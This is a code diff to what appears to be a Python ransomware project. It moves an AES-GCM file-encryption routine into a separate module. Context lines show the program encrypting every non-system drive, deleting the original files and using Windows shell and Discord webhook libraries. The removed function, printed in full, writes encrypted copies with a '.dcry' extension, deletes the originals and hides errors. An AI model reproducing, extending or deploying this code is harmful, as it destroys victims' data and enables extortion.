@@ -12,7 +12,7 @@ from concurrent.futures import ThreadPoolExecutor
 
 import requests
 import winshell
-from Crypto.Cipher import AES
+from file import encrypt_file
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from win32com.client import Dispatch
 
@@ -326,23 +326,6 @@ def start_encryption():
     ]:
         if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv("HOMEDRIVE"):
             encrypt_directory(disk, key)
-
-
-def encrypt_file(path, key, chunk_size=268435456):
-    try:
-        MAGIC = b"DCRY$"
-        encrypted_path = path + ".dcry"
-        
-        with open(path, "rb") as f_in, open(encrypted_path, "wb") as f_out:
-            f_out.write(MAGIC)
-            while chunk := f_in.read(chunk_size):
-                nonce = os.urandom(12)
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                encrypted_chunk, tag = cipher.encrypt_and_digest(chunk)
-                f_out.write(nonce + tag + encrypted_chunk)
-        os.remove(path)
-    except:
-        pass
 
 
 def encrypt_directory(directory_path, key):
